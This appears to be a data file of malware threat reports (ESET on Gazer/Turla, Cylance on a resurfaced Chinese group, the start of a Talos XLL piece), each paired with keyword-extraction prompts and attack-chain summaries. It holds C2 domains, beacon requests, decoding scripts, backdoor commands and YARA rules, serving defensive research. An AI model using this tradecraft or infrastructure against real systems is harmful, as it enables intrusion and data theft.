the orchestrator with the encrypted task received from the C&C server and its size. The orchestrator will be in charge of executing the task and will send the results to the communication module. Once the blob of the tasks results (encrypted by the orchestrator) is received, it is sent to the C&C server through a POST request in the same way that it was done for the GET request (using parameters with random values).Messages between components A global named pipe is used for the communication between the different components. The data sent through this named pipe is formatted in the following way:DatatypeID_CMDMSGFigure 3. Message format• DATATYPE: the same constants are used for the resources (check the File Format entryin the “Resources section”)• ID_CMD: the command name (check below for a complete list) • MSG: the data to be sentHere is a listing of the different commands: • CMC_TAKE_TASK (ID_CMD: 1)• When a task is retrieved by the C&C server module, it is sent to the orchestrator,which stores the task in the task queue.• CMC_TAKE_LOADER_BODY (ID_CMD: 2)18• Wipe Gazer’s original loader file, clean persistency and set up a copy of the loaderand its persistency according to one of the resources (check persistency part for details).• CMC_GIVE_RESULT (ID_CMD: 4)• When this message is received, the orchestrator will retrieve the task’s result fromthe result queue, compress and encrypt it using the server’s public RSA key (the one from the resource 102) and send the blob to the communication module which will send the whole result to the server through a POST request.• CMC_GIVE_SETTINGS (ID_CMD: 5)• The communication module sends this message to the orchestrator to requestthe information needed to contact the server (list of the servers to contact, the last connection time and the victim ID).• CMC_TAKE_CONFIRM_RESULT (ID_CMD: 6)• When the communication module sends a task’s result to the server, a message is sentto the orchestrator that will remove the task’s result from the queue.• CMC_TAKE_CAN_NOT_WORK (ID_CMD: 7)• When an operation has failed (for example, if the communication module cannot correctlyparse the data received from the orchestrator), this message is sent to the orchestrator with the last error code. The error code will be added to the logfile.• CMC_TAKE_UNINSTALL (ID_CMD: 8)• Used to wipe a file from the disk.• CMC_TAKE_NOP (ID_CMD: 9)• No operation• CMC_NO_CONNECT_TO_GAZER (ID_CMD: 0xA)• This command is sent to the orchestrator when the communication module cannotcontact any of the servers. In this case, if a pending task’s results are in the queue, they are stored encrypted in Gazer’s storage.• CMC_TAKE_LAST_CONNECTION (ID_CMD: 0xB)• This command is sent from the communication module to the orchestrator each time a connection is established to the C&C server. It contains a structure SystemTime (filled with the current system time). Once the message is received by the orchestrator, the last connection date is stored compressed and encrypted in the Gazer storage (either the registry or ADS).• CMC_GIVE_CACHE / CMC_TAKE_CACHE (ID_CMD: 0xC / 0xD)• Not implemented19Gazer verSIonS Four different versions have been identified. In the first version, the function used to write logs has as its parameter the real function name where the log occurs. There were also different methods used to inject code (the one documented in this whitepaper and one based on window injection). In a second version, the function names used as parameters are replaced by an ID and only one method is used for code injection. Also, the string “NO OLD METHODS” appears in this part of the code. Some samples from the first versions were signed with a valid certificate issued by Comodo for “Solid Loop Ltd”. The compilation date appears to be 2002 but is likely to be faked because the certificate was issued in 2015.The latest versions are signed with a different certificate: “Ultimate Computer Support Ltd”.Figure 4.Certificates used to sign the malware variantsSome efforts have been made to obfuscate strings that can be used as IoCs. The mutex name and the named pipe do not appear in cleartext anymore; they are now encoded with a XOR key. On the previous versions, the logfile names were hardcoded in the binary. The function GetTempFileNameA is now used to generate a random filename. The C&C server returns a 404 or 502 status code page, whereas it was only a 404 in the previous versions. In the latest versions compiled in 2017, the log messages are different (although they have the same meaning). For example: “PE STORAGE” is replaced by “EXE SHELTER”, “PE CRYPTO” by “EXE CIPHER” etc… Last but not least, the compilation timestamp seems not to be faked anymore. In conclusion, Gazer is a very sophisticated piece of malware that has been used against different targets in several countries around the world. Through the different versions we found and analyzed, we can see that this malicious backdoor is still being actively developed and used by its creators.Indicators of Compromise can also be found on github. For any inquiries, or to make sample submissions related to the subject, contact us at: threatintel@eset.com.20IoCSFilenames • %TEMP%\KB943729.log • %TEMP%\CVRG72B5.tmp.cvr • %TEMP%\CVRG1A6B.tmp.cvr • %TEMP%\CVRG38D9.tmp.cvr • %TEMP%\~DF1E06.tmp • %HOMEPATH%\ntuser.dat.LOG3 • %HOMEPATH%\AppData\Local\Adobe\AdobeUpdater.exeRegistry keys • HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ScreenSaver • HKCU\Software\Microsoft\Windows NT\CurrentVersion\Explorer\ScreenSaverC&C URLs • daybreakhealthcare.co.uk/wp-includes/themees.php • simplecreative.design/wp-content/plugins/calculated-fields-form/single.php • outletpiumini.springwaterfeatures.com/wp-includes/pomo/settings.php • zerogov.com/wp-content/plugins.deactivate/paypal-donations/src/PaypalDonations/SimpleSubsribe.php• ales.ball-mill.es/ckfinder/core/connector/php/php4/CommandHandler/CommandHandler.php • dyskurs.com.ua/wp-admin/includes/map-menu.php • warrixmalaysia.com.my/wp-content/plugins/jetpack/modules/contact-form/grunion-table-form.php • shinestars-lifestyle.com/old_shinstar/includes/old/front_footer.old.php • www.aviasiya.com/murad.by/life/wp-content/plugins/wp-accounting/inc/pages/page-search.php • baby.greenweb.co.il/wp-content/themes/san-kloud/admin.php • soligro.com/wp-includes/pomo/db.php • giadinhvabe.net/wp-content/themes/viettemp/out/css/class.php • tekfordummies.com/wp-content/plugins/social-auto-poster/includes/libraries/delicious/Delicious.php • kennynguyen.esy.es/wp-content/plugins/wp-statistics/vendor/maxmind-db/reader/tests/MaxMind/Db/test/Reader/BuildTest.php• sonneteck.com/wp-content/plugins/yith-woocommerce-wishlist/plugin-fw/licence/templates/panel/activation/activation.php• chagiocaxuanson.esy.es/wp-content/plugins/nextgen-gallery/products/photocrati_nextgen/modules/ngglegacy/admin/templates/manage_gallery/gallery_preview_page_field.old.php• hotnews.16mb.com/wp-content/themes/twentysixteen/template-parts/content-header.php • zszinhyosz.pe.hu/wp-content/themes/twentyfourteen/page-templates/full-hight.php • weandcats.com/wp-content/plugins/broken-link-checker/modules/checkers/http-module.phpMutexes {531511FA-190D-5D85-8A4A-279F2F592CC7}21HashesTable 6.Gazer sample hashesSHA1 hashComponent27FA78DE705EbAA4b11C4b5FE7277F91906b3F92Gazer wiper x3235F205367E2E5F8A121925bbAE6FF07626b526A7Gazer loader x32b151CD7C4F9E53A8DCbDEb7CE61CCDD146Eb68AbGazer loader x32E40bb5bEEC5678537E8FE537F872b2AD6b77E08AGazer loader x32522E5F02C06AD215C9D0C23C5A6A523D34AE4E91Gazer loader x64C380038A57FFb8C064851b898F630312FAbCbbA7Gazer loader x64267F144D771b4E2832798485108DECD505Cb824AGazer loader x6452F6D09CCCDbC38D66C184521E7CCF6b28C4b4D9Gazer loader x32475C59744ACCb09724DAE610763b7284646Ab63FGazer loader x3222542A3245D52b7bCDb3EAEF5b8b2693F451F497Gazer loader x322b9FAA8b0FCADAC710C7b2b93D492FF1028b5291Gazer loader x64E05Ab6978C17724b7C874F44F8A6CbFb1C56418DGazer loader x646DEC3438D212b67356200bbAC5EC7FA41C716D86Gazer loader x64b548863DF838069455A76D2A63327434C02D0D9DGazer loader x64CompilationTime07/04/201615:04:2405/02/200217:36:1005/02/200217:36:1005/02/200217:36:1005/02/200217:36:2605/02/200217:36:2605/02/200217:36:2604/10/200218:31:3704/10/200218:31:3704/10/200218:31:3704/10/200218:34:1804/10/200218:34:1804/10/200218:34:1809/01/201619:30:10CertificateEset DetectionNamenot signedWin32/Turla.CLadmin@solidloop.org valid from 14/10/2015to 14/10/2016admin@solidloop.org valid from 14/10/2015to 14/10/2016admin@solidloop.org valid from 14/10/2015to 14/10/2016admin@solidloop.org valid from 14/10/2015to 14/10/2016admin@solidloop.org valid from 14/10/2015to 14/10/2016admin@solidloop.org valid from 14/10/2015to 14/10/2016admin@solidloop.org valid from 14/10/2015to 14/10/2016admin@solidloop.org valid from 14/10/2015to 14/10/2016admin@solidloop.org valid from 14/10/2015to 14/10/2016admin@solidloop.org valid from 14/10/2015to 14/10/2016admin@solidloop.org valid from 14/10/2015to 14/10/2016admin@solidloop.org valid from 14/10/2015to 14/10/2016Win32/Turla.CCWin32/Turla.CCWin32/Turla.CCWin64/Turla.AAWin64/Turla.AAWin64/Turla.AAWin32/Turla.CCWin32/Turla.CCWin32/Turla.CCWin64/Turla.AAWin64/Turla.AAWin64/Turla.AAnot signedWin64/Turla.AAadmin@C3E6511377DFE85A34E19b33575870DDA8884C3CGazer loader x6406/02/201619:29:15ultimatecomsup.biz valid from 16/12/2015Win64/Turla.AA9FF4F59CA26388C37D0b1F0E0b22322D926E294AGazer loader x64to 16/12/2017admin@16/02/201616:00:44ultimatecomsup.biz valid from 16/12/2015Win64/Turla.AAto 16/12/201722SHA1 hashComponentCompilationTimeCertificateadmin@Eset DetectionName029AA51549D0b9222Db49A53D2604D79AD1C1E59Gazer loader x6418/02/201615:29:58ultimatecomsup.biz valid from 16/12/2015Win64/Turla.AAto 16/12/2017admin@CECC70F2b2D50269191336219A8F893D45F5E979Gazer loader x6401/01/201708:39:30ultimatecomsup.biz valid from 16/12/2015Win64/Turla.AG7FAC4FC130637AFAb31C56CE0A01E555D5DEA40DGazer loader x6411/06/201723:43:51ultimatecomsup.biz valid from 16/12/2015Win64/Turla.AD5838A51426CA6095b1C92b87E1bE22276C21A044Gazer loader x3219/06/201701:28:51ultimatecomsup.biz valid from 16/12/2015Win32/Turla.CFto 16/12/2017admin@to 16/12/2017admin@3944253F6b7019EED496FAD756F4651bE0E282b4Gazer loader x64to 16/12/2017admin@19/06/201701:30:00ultimatecomsup.biz valid from 16/12/2015Win64/Turla.ADto 16/12/2017228DA957A9ED661E17E00EFbA8E923FD17FAE054295D142A7bDCED124FDCC8EDFE49b9F3ACCEAb8A0F97F599FAb7F8057424340C246D3A836C141782Dbb185E493A0FDC959763533D86D73F986409F1b4701828DEE543b994ED2578b9E0D3991F22bD8276FD611667bA19691958b5b72673b9b802EDD7FF8FCAbEb735C51E2b8Eb6Fb07bDA8b95401D069bD875831DF9CbCFD7bF812511148D2A0F117324A75FbAE3AE65C32838Fb52A0F5AD2CDE8659D2bFF9F337FF6841419ADC51EEb8756660b2Fb46F3Eb24ED9E6DE3577b463451b7AFCE24Ab646EF62AD6C2bD795C6EE27b147FF0A05C0477F70477E315916E0E8184AD9D6bbD03E99A397F8E925FA66CFbE5CF1b7CED96b08D7593E28FEE616ECCbC6338896517CF63C534630C2CE0070AD203F9704F1526E83AE58623F1E3bE3175D49E7b262CD88CFD517694DCbA18Gazer05/02/2002orchestrator x3217:31:28Gazer05/02/2002orchestrator x3217:31:28Gazer05/02/2002orchestrator x3217:31:28Gazer05/02/2002orchestrator x3217:31:28Gazer05/02/2002orchestrator x6417:34:25Gazer05/02/2002orchestrator x6417:34:25Gazer05/02/2002orchestrator x6417:34:25Gazer04/10/2002orchestrator x3218:31:28Gazer04/10/2002orchestrator x3218:31:28Gazer04/10/2002orchestrator x6418:33:02Gazer04/10/2002orchestrator x6418:33:02Gazer04/10/2002orchestrator x6418:33:02Gazer09/01/2016orchestrator x6419:28:29Gazer06/02/2016orchestrator x6419:29:04Gazer06/02/2016orchestrator x6419:29:04Gazer18/02/2016orchestrator x6415:29:3223not signedWin32/Turla.CFnot signedWin32/Turla.CFnot signedWin32/Turla.CFnot signedWin32/Turla.CCnot signedWin64/Turla.AAnot signedWin64/Turla.AAnot signedWin64/Turla.AAnot signedWin32/Turla.CCnot signedWin32/Turla.CCnot signedWin64/Turla.AAnot signedWin64/Turla.AAnot signedWin64/Turla.AAnot signedWin64/Turla.AAnot signedWin64/Turla.AAnot signedWin64/Turla.AAnot signedWin64/Turla.AASHA1 hashComponentCompilationTimeCertificateEset DetectionName7A6F1486269AbDC1D658Db618DC3C6F2AC85A4A711b35320Fb1CF21D2E57770D8D8b237Eb4330EAAE8A2bAD87027F2bF3ECAE477F805DE13FCCC0181950F0b0C7701835C5FbDb6C5698A04b8AFE068E6Gazer01/01/2017orchestrator x6408:39:19Gazer11/06/2017orchestrator x6423:42:28Gazer19/06/2017orchestrator x3201:28:21Gazer19/06/2017orchestrator x6401:29:46not signedWin64/Turla.AGnot signedWin64/Turla.ADnot signedWin32/Turla.CFnot signedWin64/Turla.ADA5EEC8C6AADF784994bF68D9D937bb7AF3684D5C Gazer comm x64411EF895FE8DD4E040E8bF4048F4327F917E5724Gazer comm x32C1288DF9022bCD2C0A217b1536DFA83928768D06Gazer comm x324b6EF62D5D59F2FE7F245DD3042DC7b83E3CC923Gazer comm x327F54F9F2A6909062988AE87C1337F3CF38D68D35Gazer wiper x3205/02/200217:57:0705/02/200217:58:2206/02/201619:23:5211/06/201723:44:2405/02/200217:39:07admin@solidloop.org valid from 14/10/2015to 14/10/2016admin@solidloop.org valid from 14/10/2015to 14/10/2016Win64/Turla.AHWin32/Turla.CCnot signedWin32/Turla.CCnot signedWin32/Turla.CFadmin@solidloop.org valid from 14/10/2015to 14/10/2016Win32/Turla.CL24appendICeSFunction names There are a few samples of Gazer that use the current function name as first parameter for the log function. Here is a list of some function names used in Gazer: • AutorunManager Class• AutorunManager::~AutorunManger • AutorunManager::FullStart• HiddenTaskAutorun Class• HiddenTaskAutorun::IsPathsEqual• LinkAutorun Class• LinkAutorunClass::InfectLnkFile • LinkAutorunClass::ClearLnkFile • LinkAutorunClass::CheckLnkFile• RemoteImport32 Class• RemoteImport32::RemoteImport32 • RemoteImport32::GetRemoteProcAddress • RemoteImport32::GetRemoteModuleHandle• ScreenSaverAutorun Class• ScreenSaverAutorun::ChangeScreenSaver • ScreenSaverAutorun::CloseHiddenWindow• ShellAutorun Class• ShellAutorun::AutorunInstallEx • ShellAutorun::IsPathsEqual• StartupAutorun Class• StartupAutorun::AutorunInstallEx • StartupAutorun::IsPathsEqual• TaskScheduler20Autorun Class• TaskScheduler20Autorun::Init • TaskScheduler20Autorun::IsPathsEqual25• DllInjector Class• DllInjector::LoadDllToProcess • DllInjector::WindowInject• InjectManager Class• InjectManager::~InjectManager • InjectManager::VictimManualCreateIE• TNPTransport Class• TNPTransport::Init • TNPTransport::ServerProc• ExeStorage Class• ExeStorage::Migrate • ExeStorage::SecureHeapFree• FSStorage Class• FSStorage::~FSStorage • FSStorage::Empty• RegStorage Class• RegStorage::~RegStorage • RegStorage::Init • RegStorage::FreeList26• RegStorage::GetListBlock • RegStorage::Empty• ResultQueue Class• ResultQueue::~ResultQueue • ResultQueue::print• TaskQueue Class• TaskQueue::~TaskQueue • TaskQueue::print• CExecutionSubsystem Class• CExecutionSubsystem::~CExecutionSubsystem • CExecutionSubsystem::UpdateStorage• CMessageProcessingSystem Class• CMessageProcessingSystem::~CMessageProcessing • CMessageProcessingSystem::Receive_GIVE_RESULT27• CMessageProcessingSystem::Receive_TAKE_CONFIRM_RESULT • CMessageProcessingSystem::Send_TAKE_RESULT• Crypto Class• Crypto::GetPublicKey • Crypto::DecompressBuffer• LTManager Class• LTManager::~LTManager • LTManager::ClearRoute28• LTManager::ClearTask • LTManager::DeleteEvents• LTMessageProcessing Class• LTMessageProcessing::ListenerCallBack • LTMessageProcessing::Send_TAKE_ERROR_UNKNOWN• LTNamedPipe Class• LTNamedPipe::ReInit • LTNamedPipe::ClientCommunicationYara rulesimport “pe” import “math” import “hash”rule Gazer_certificate_subject { condition: for any i in (0 pe.number_of_signatures - 1): (pe.signatures[i].subject contains “Solid Loop” or pe.signatures[i].subject contains “Ultimate Computer Support”) $certif1 = {52 76 a4 53 cd 70 9c 18 da 65 15 7e 5f 1f de 02} $certif2 = {12 90 f2 41 d9 b2 80 af 77 fc da 12 c6 b4 96 9c} condition: (uint16(0) == 0x5a4d) and 1 of them and filesize < 2MB $s1 = “CVRG72B5.tmp.cvr” $s2 = “CVRG1A6B.tmp.cvr” $s3 = “CVRG38D9.tmp.cvr” condition: (uint16(0) == 0x5a4d) and 1 of them }29 ","{'phrases': ['First', 'malware', 'Skipper', 'GAZER', 'payload', 'loader', 'the orchestrator', 'explorer', 'data', 'ADS', 'Modules', 'resources', 'files', 'the communication module', 'process', 'access', 'C2', 'end', 'result', 'configuration', 'tasks'], 'target': 'First; malware; Skipper; GAZER; payload; loader; the orchestrator; explorer; data; ADS; Modules; resources; files; the communication module; process; access; C2; end; result; configuration; tasks.'}"
the threat actor; CVE-2012- 0158; The document; CVE-2012- 0158; a user; India; the document; CVE-2012- 0158; EXE; the second stage; a DLL; Run; the victim user; the backdoor; the attack; the system; HTTP POST; commands; data; IP addresses.,"['1. The attackers send phishing emails with weaponized Office document attachments containing exploits. 2. If the exploit is successful, a first stage shellcode decodes and launches a second stage shellcode. 3. The second stage shellcode decodes and installs a DLL backdoor module from the document. 4. The DLL backdoor is configured to contact an external C2 server to receive commands. 5. The malware establishes persistence via a Run registry key to execute on user login. 6. The backdoor can download additional modules or tools from the C2 server. 7. It uses HTTP requests with encryption to communicate and exfiltrate data to the C2 server. 8. Alternatively, it may use Poison Ivy as a backup RAT if the main C2 communication fails. ']","Extract the keywords: Cylance SPEAR Team: A Threat Actor ResurfacesMay 13, 2015 By Jon Gross(url This:Attackers typically shut down campaigns or halt activity after they are exposed by security researchers, thereby creating the impression they have dropped off the map. This often leads to a false sense of security within the community and perpetuates the idea that public exposure makes us all safer. While the exposed activity is no longer observed, attackers simply continue in the background – evolving or altering their tactics to seamlessly continue operations with increasingly advanced malware. So while potentially making us safer in the short-term, exposure often forces a Darwinian evolution in malware.Several months ago I examined a malware-tainted Word document titled “ISIS_twitter_list.doc.” I didn’t think much of it and quickly moved on after a cursory analysis. Yet I recently uncovered evidence that suggests it was the work of a well-known Chinese threat group. This group is known to have targeted U.S. government agencies, defense contractors, aerospace firms and foreign militaries since 2009. Until now, it was widely believed the actor's activities had largely subsided in 2013, following numerous public disclosures and detailed analyses of their backdoors.Our technical analysis shows the group has remained active. We are releasing this data to help victims identify and remediate the threat. Click here(url resurfaces#mitigation) to get to recommended mitigations, or for all the technical details read on:It all began with the MIME encoded document ""ISIS_twitter_list.doc"", which exploited the familiar CVE-2012- 0158(url and was first uploaded to Virustotal from a user in India. Other targets identified were predominantly located in Australia, New Zealand, Vietnam and the United States.File DetailsISIS_twitter_list.doc 146,338 bytesName The first stage shellcode searches for the marker ""GfCv"" then checks the next four bytes are ""EF FE EC CE"" in the document then decodes the second stage shellcode using the four-byte XOR key ""0x29F7C592"". This second stage finds and decodes an encoded executable beginning at offset 0x33A2.The binary is encoded using a variable 4-byte XOR key that is generated by starting with the 4-byte key 0x7FFEFC00; this XOR key is then permutated every four bytes by rotating the first two bytes of the key by 0x1 and shifting the bits of the next two bytes right by 0x1, so the next 4-byte XOR key in the series would be 0x3FFF7E00. It includes some logic to exclude XOR'ng any bytes that match 0x00000000 or the current 4- byte XOR key.For the binary mathematically impaired like myself the 4-byte keys will eventually repeat in effect creating a 256-byte XOR key. The decoded binary will be written to the filesystem as ""%APPDATA%\Microsoft\Systemcertificates\Certificates.ocx"".File DetailsFull File Path Compile Time%APPDATA%\Microsoft\Systemcertificates\Certificates.ocx 107,008 bytes 2/4/2015 8:41:42 UTCThe malware does not execute immediately after successful exploitation and instead just creates a Run key in the current user's hive which will execute the next time the victim user accesses the system.Registry Persistence Key Registry Key ValueHKCU\Software\Microsoft\Windows\CurrentVersion\Run\Certificates Rundll32.exe ""%APPDATA%\Microsoft\SystemCertificates\Certificates.ocx"",SetupThe ocx file is actually a DLL and provides the attacker the ability to upload, download, enumerate, delete, search, and execute files as well as list drivers on the system. The binary is designed to be called from its one exported function, ""Setup""; the Run key will ensure that whenever the victim user logs into the system the backdoor will execute. The binary is configured to communicate to ""www.microsoftservices.proxydns.com"" on port 80 using standard HTTP POST and GET requests. The domain at the time of this report resolved to ""rampage.freetcp.com"" have both historically resolved to this IP address.Example initial beacon request:GET /login?wd=hvJZkcIvKKupNRlsqI0aN6jZDTYPz6ZS9Q- H5bCXiER37jqqCDzS3wIUulYOjyKHcDomZCD72mAc4fSCoHhJJ1UQliBkraMepzS5J3UUFUH- nofoOgVM02UlCs4LJANIuZH90vM5KH_Ih59DdVRbgQ==HTTP/1.1User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)Host: www.microsoftservices.proxydns.comCache-Control: no-cacheThe above beacon request can be decoded by base64 decoding with this alphabet, ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"". Then RC4 decrypting the resulting string using the first four bytes of the payload as the decryption key. The following python script will make this easy:from Crypto.Cipher import ARC4 import base64,binascii,string def customb64decode(s): newalphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_' oldalphabet = string.uppercase + string.lowercase + string.digits + ""+/"" s = s.translate(string.maketrans(newalphabet, oldalphabet)) return base64.b64decode(s) unb64 = customb64decode(req) rc4 = ARC4.new(unb64[0:4]) dec = rc4.decrypt(unb64[4::]) Decoding the string will yield the following: m:<MAC ADDRESS>Where k: is a unique identifier for the victim, s: is a campaign identifier included in the backdoor, h: is the hostname of the victim computer, u: is the victim user, o: is the operating system and service pack level, and m is the mac address.Based upon some cursory analysis the backdoor will look for encrypted commands within HTML comments returned from the C2 using the following format: ""<!  ?*$@COMMAND GOES HERE@$*?  !>;"" however, the C2 was not active at the time of analysis so this could not be confirmed. The backdoor may also make requests to the C2 over HTTP using the following parameters in the URI string ""query?sid="" and ""result? sid="".The PDB path, C:\Codes\Eoehttp\Release\Eoehttp.pdb, was also left in the backdoor although no other instances of this path could be identified. Several additional exploit documents were identified by 1.doc Naval Science Curriculum 2014.doc 459,087The document exploits old faithful, CVE-2012-0158(url name=CVE-2012-0158), but instead of using a MIME encoded document this file was just a plain RTX document. Yes that's not a misspelling Word is happy to open this RTF format as well. So for anyone exploring and hunting RTF documents you may also want to start looking for the ""{\rtx"" header. We'll skip the shellcode analysis for now and go directly to the binary which is stored beginning at offset 0x1BC27 as an ASCII hex-encoded, xor-encoded binary. It can be decoded using the XOR key ""0xBF"". Upon successful exploitation the decoded binary will be written first to %TEMP%\dw20.EXE then copied to %WINDIR%\msascm32.drv. No other changes are made to the system.File DetailsFull File Path: Compile Time:%WINDIR%\msacm32.drv 108,544 Bytes 9/26/2013 01:46:23 UTCI'm always curious when no registry changes are made in the exploitation process. At first the backdoor failed to load or really do anything in my VM until I read what the ""msascm32.drv"" file does. Looking at the original file's (%WINDIR%\system32\msacm32.drv) imported functions, it's clear the DLL is responsible for some type of audio processing and/or playback. A quick search on the internet confirmed this so I added a soundcard to my VM.On reboot explorer.exe was now happy to load the backdoor and get down to business; this technique is known as dll search order hijacking or binary planting. Interestingly the backdoor will also load the legitimate system32\msacm32.drv file resolve functions and pass calls to it so it doesn't break audio playback on the victim system. The backdoor contains identical exports as well as an additional dummy function from the legitimate msacm32.drv called ""StartWork"" which can be used to reliably identify similar samples. The backdoor routine exists inside the DllMain function so when explorer.exe loads the backdoor via LoadLibrary it will begin spawning malicious threads.A PDB path was also left in this binary C:\Users\cmd\Desktop\msacm32\Release\msacm32.pdb; A quick google search will lead you to a YARA rule written by Patrick Olsen and the very similar sample two files also have an identical compilation time, which suggests the backdoor is probably not recompiled very often and instead the attacker simply updates the callback configuration information.The backdoor interestingly contains the well known Poison Ivy RAT shellcode as well as its own custom backdoor. It will first attempt to communicate to fighthard.mooo.com using the poison ivy binary protocol with the default connection password of ""admin"". The Poison Ivy shellcode is encrypted using a custom cipher with the key ""Tiger324{"" beginning at offset 0xFA5 and ending at 0x159E. If this initial connection fails it will revert to the secondary backdoor, which utilizes HTTP GET and POST requests somewhat similar to the compromised other systems in the environment and was using an internal C2 mechanism for a fallback.Example Internal Beacon:GET /login.asp? p*hWe8J5pF*k5xv5XeUhIJbKZQfySZRv1NcwhQi2ZHKKvGBC8EjiadbWLoUcgUxJyZElD7AY0DCWmzbIa9IX structure is slightly different in that it uses the base64 alphabet ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+*"". The resulting request can be decoded further by using the first 16 bytes of the result as an XOR key to decode the rest of the payload. It also uses a static User-Agent string of ""Mozilla/4.0 (compatible; MSIE 8.0; Win32)"" for each request.The following script simplifies this process:def rolling_xor(buf, key): for i in buf: if k == len(key): k = 0 out += chr(ord(i) ^ ord(key[k])) 'p*hWe8J5pF*k5xv5XeUhIJbKZQfySZRv1NcwhQi2ZHKKvGBC8EjiadbWLoUcgUxJyZElD7AY0DCWmzbIa9I XEJ7OZkvwBZVx1JsrhQ==' unb64 = base64.b64decode(req,'+*') dec = rolling_xor(unb64[16::],unb64[0:16]) print decThe request decodes to ""123|000000+|USER-D6921F6215|Administrator|-1676096002|1.0|0|"", where values are separated by the delimiter ""|"". ""123"" is a campaign identifier hard coded into the backdoor. I don't know what ""000000+"" is but it's also a hard coded value; my best guess is it's to modify the timezone of the timestamp. ""USER-D6921F6215"" is the hostname of the victim, ""Administrator"" is the victim user, ""1676096002"" is the current Date/Time in decimal, and ""1.0"" is a version number also stored in the backdoor.The 16-byte XOR key will be randomly generated per each request. Results from commands will be sent back encoded to the server to the ""result.asp"" page.The backdoor will accept the following commands:#runhfcore- starts the main PI backdoor functionality in a separate thread #getdrivelist? - enumerates logical drives on the system #getfilelist? - enumerates logical files using FindFirst FindNext technique #delfile- deletes a file using the DeleteFileA API #newupload? - uploads a file #newdownload? - downloads a file #runfile- - executes a file on the system via CreateProcess API #urldownload? - will download a file from a remote URL using InternetOpen and InternetReadFile #sleep? - Sleeps for a specified number of minutes #delay? - exact functionality unknown appears to force another request to the C2 page check.asp #maxblock? - exact functionality unknown appears to force another request to the C2 page check.asp #stop! - exact functionality unknown appears to force another request to the C2 page check.aspCommands with a ? appear to take an additional parameter while files that end in - require a full file path. The backdoor is also capable of elevating its privileges on win7 and above using a method similar to the one described here: url I thought it was interesting the backdoor used a secondary backup backdoor in addition to its primary payload.The first communicated directly outside the network using a well known RAT protocol and if that failed the secondary much stealthier backdoor communicated to an internal C2 address using it's own custom encoded HTTP based protocol. The use of a relatively undisclosed DLL search order hijack also made thissample unique. Detection rates for this binary seem to be pretty good right now 39/57; however, at the time it was first used in late January 2014 detection rates were much poorer. Other samples from the identified ""fighthard.mooo.com"" previously resolved to also historically had two other domains point to it ""queenberry.www1.biz"" and ""word.crabdance.com"". ""word.crabdance.com"" previously resolved to address and the associated domain ""www.ollay011.zyns.com"" are rather infamous and the first mention of it I could find is in this shadowserver post: url download-recent-purported-ceiec-document-dump-booby-trapped/ related to exploit documents identified in a data dump from Hardcore Charlie. If you follow the rabbit hole deep enough you can eventually trace samples via domain and IP address crossover back to the FBI flash #A-000009-MW from mid 2013. Additional domains and IP addresses related to this group are included in the appendix.MitigationWhile defending against the constant stream of new malware from advanced threat groups may be difficult, organizations can take some relatively easy steps to help identify intrusions. This group is among the numerous threat actors who rely almost exclusively on Dynamic DNS infrastructure. They seem to prefer ChangeIP (url dynamic-dns/)) and Afraid (url for free DNS services, although they previously heavily used Sitelutions (url While there are some legitimate instances of dynamic DNS in corporate environments, it only accounts for a small percentage of traffic. Monitoring and/or blocking dynamic DNS requests should help detect attacks by this actor. Any dynamic thoroughly investigated. The HTTP traffic generated by both samples uses a limited number of header fields, which is substantially different from the majority of traffic generated by modern browsers. As always, don't open E-mail attachments from untrusted parties.APPENDIX A: Associated IP Addresses and Domains microsoftservices.proxydns.com - current rampage.freetcp.com - current www.micro.zyns.com - current computer001.dumb1.com - current word.crabdance.com - 11/12/2012 fighhard.mooo.com - 1/31/2014 queenberry.www1.biz - 10/1/2014 anhtuan88.ns01.biz word.crabdance.com - 9/8/2012 www.fornobody.dns04.com ftp.fornobody.dns04.com fornobody.dns04.com - 9/2/2011 www.qwertyui.dns04.com - 2/24/2012 www.qwertyui.dns04.com - 3/3/2012 beyondbuck.dns1.us letitsnowsmart.instanthq.com prime98.jumpingcrab.com www.micro.zyns.com www.qwertyui.dns04.com - 3/2/2011 www.ollay011.zyns.com - 3/4/2011 www.olay033.dns04.com - 3/12/2011 www.olay044.dns04.com - 4/30/2011 9999992009.rr.nu 9999992011.rr.nu www.qwertyui.dns04.com - 3/4/2012 www.qwertyui.dns04.com - 10/8/2010 www.olay033.dns04.com - 10/4/2010 webhosts.sytes.netAPPENDIX B: Phishing Emails Associated with the CampaignTags: CylanceSPEAR(url« Back to Blog(url ","{'phrases': ['the attacker', 'attackers', 'phishing emails', 'exploits', 'the exploit', 'first', 'the second stage shellcode', 'a DLL', 'the document', 'the DLL', 'commands', 'The malware', 'persistence', 'Run', 'key', 'User', 'the backdoor', 'addition', 'the C2', 'HTTP', 'requests', 'RAT', 'data', 'Poison Ivy'], 'target': 'the attacker; attackers; phishing emails; exploits; the exploit; first; the second stage shellcode; a DLL; the document; the DLL; commands; The malware; persistence; Run; key; User; the backdoor; addition; the C2; HTTP; requests; RAT; data; Poison Ivy.'}"
Office; VBA macros; Microsoft Office; the user; the document; DLL; XLL files; the.NET bytecode; VSTO plugins; the payloads; the registry; a random name; the.NET bytecode; a random name; a random name; Excel; XLLs; code; the victim; server; the malware; Excel; credentials; Office macros; the user; control; the server; commands; COM; COM servers; malicious code; RAT; Excel; the user; the system; persistence; the malware.,"['1. The attacker creates a malicious XLL file, often using a framework like Excel-DNA. 2. The XLL implements exports like xlAutoOpen that will execute code when opened. 3. The attacker emails the victim an XLL file, disguised as an invoice, report, etc. 4. The victim receives the email and opens the attached XLL file. 5. Excel displays a warning prompt about the XLL containing code. 6. If the victim allows/enables the code, the xlAutoOpen export executes. 7. The xlAutoOpen code typically downloads next stage payloads. 8. The downloaded malware executes, compromising the system. 9. The malware establishes persistence and connects to a C2 server. 10. The attacker can then leverage the malware for further objectives. ']","Extract the keywords: blog.talosintelligence.com /xlling-in-excel-malicious-add-ins/ Threat Spotlight: XLLing in Excel - threat actors using malicious add-ins Vanja Svajcer ⋮ ⋮ 12/20/2022By Vanja SvajcerTuesday, December 20, 2022 08:12 Threat Spotlight Threats SecureXMicrosoft is phasing out support for executing VBA macros in downloaded Office documents. Cisco Talos investigates another vector for introduction of malicious code to Microsoft Excel— 